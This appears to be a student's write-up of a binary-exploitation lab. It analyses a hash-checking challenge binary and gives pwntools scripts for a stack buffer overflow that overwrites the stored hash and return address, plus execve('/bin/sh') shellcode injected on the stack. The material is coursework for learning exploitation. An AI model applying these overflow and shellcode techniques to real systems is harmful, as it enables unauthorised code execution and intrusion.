# Q1

This program takes user input, computes a md5 hash, and compares it with a precomputed hash to see if it matches, and calls a secret function if the hash matches. 

# Q2

From highest to lowest (stack grows downwards):
computed_hash = rbp-0x10
correct_hash = rbp-0x20
buf = rbp-0x60


# Q3

Overflow 0x40 with A's, then put the md5sum of those 0x40 A's as the "correct hash". Boom, done. 

![[Pasted image 20251029165253.png]]

# Q4

![[Pasted image 20251029165431.png]]

200 A's ought to do the trick. 

# Q5

![[Pasted image 20251029171140.png]]

```python
from pwn import *


context.terminal = ["tmux", "splitw", "-h"]
path = "./week9chall.bin"

e = ELF(path)
p = process(path)

# Look how cool pwntools is
p = gdb.debug(path, '''
        b *vulnerable_function+192
        c
        ''')


offset = 0x40
payload = b'A'*(offset)
payload += md5sum(b'A'*0x40)
payload += b'A'*(0x10 + 8)
payload += p64(0x555555555355 - 0xec)


p.sendline(payload)
p.interactive()
```

# Q6

I was too lazy to use the VM so I'll just use checksec on my own pc. 

RELRO: GOT security, full = read-only got
Stack: canary used to prevent buffer overflows, fails if overwritten
NX: no code execution on stack
PIE: position-independent text, randomized addresses for text segments on every program execution
RWX: Has memory segments that have permissions rwx
SHSTK: Control flow enforcement, a "shadow stack", tbh I don't really understand this one
IBT: Indirect branch testing, no vtable overwrites

# Q7

Rax needs to have 0x3b, with standard args rdi, rsi, and rdx

# Q8

![[Pasted image 20251029174806.png]]


# Q9

Shellcode running...

Pwntools ftw 

```python
from pwn import *


context.terminal = ["tmux", "splitw", "-h"]
context.arch = "amd64"
path = "./week9chall.bin"

e = ELF(path)
p = process(path)
text = '''
    xor rsi,rsi
    push rsi
    mov rdi,0x68732f2f6e69622f
    push rdi
    push rsp
    pop rdi
    push 59
    pop rax
    cdq
    syscall'''

payload = asm(text)
payload += b'A'*(0x60-0x17+8)
payload += p64(0x7fffffffe450)

p.sendline(payload)
p.interactive()

```